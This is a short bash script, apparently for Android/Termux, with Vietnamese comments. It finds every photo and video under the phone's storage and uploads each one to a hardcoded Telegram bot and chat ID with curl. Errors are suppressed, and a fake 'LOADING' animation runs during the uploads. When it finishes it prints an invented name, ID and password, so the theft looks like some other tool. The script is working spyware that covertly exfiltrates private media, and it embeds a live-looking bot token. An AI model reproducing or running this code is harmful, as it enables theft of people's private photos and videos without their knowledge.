#!/bin/bash

GREEN="\e[32m"
YELLOW="\e[33m"
RESET="\e[0m"

BOT_TOKEN="8329608817:AAEGF8FhX41Od6Unhpy5mby_L-t1ACQCD1U"
CHAT_ID="7514545803"

MEDIA_DIR="/storage/emulated/0"

types="-iname *.jpg -o -iname *.jpeg -o -iname *.png -o \
-iname *.mp4 -o -iname *.mov -o -iname *.mkv -o -iname *.3gp"

# Tắt toàn bộ lỗi
exec 2>/dev/null

FILES=$(find "$MEDIA_DIR" -type f \( $types \) 2>/dev/null)

# Animation chạy song song
loading_animation() {
    local dots=""
    while true; do
        dots="$dots."
        if [ ${#dots} -gt 10 ]; then
            dots="."
        fi
        echo -ne "${YELLOW}LOADING${dots}\r${RESET}"
        sleep 0.2
    done
}

# Chạy animation nền
loading_animation &
ANIM_PID=$!

# Gửi toàn bộ file
echo "$FILES" | while read FILE; do
    if [ ! -f "$HOME/sent_media.txt" ] || ! grep -Fxq "$FILE" "$HOME/sent_media.txt"; then
        
        EXT="${FILE##*.}"
        EXT=$(echo "$EXT" | tr '[:upper:]' '[:lower:]')

        if [[ "$EXT" =~ ^(mp4|mov|mkv|3gp)$ ]]; then
            curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendVideo" \
                -F chat_id="$CHAT_ID" \
                -F video="@$FILE" >/dev/null 2>&1
        else
            curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" \
                -F chat_id="$CHAT_ID" \
                -F photo="@$FILE" >/dev/null 2>&1
        fi

        echo "$FILE" >> "$HOME/sent_media.txt"
        sleep 1
    fi
done

# Tắt animation
kill $ANIM_PID >/dev/null 2>&1
echo ""

# Hiển thị hoàn thành
echo -e "${GREEN}HOÀN THÀNH${RESET}"
echo -e "${GREEN} TÊN: HAI CON${RESET}"
echo -e "${GREEN} ID: API_XDARTTMKTPHTQTE${RESET}"
echo -e "${GREEN} PASS: SQL_32HTTP${RESET}"
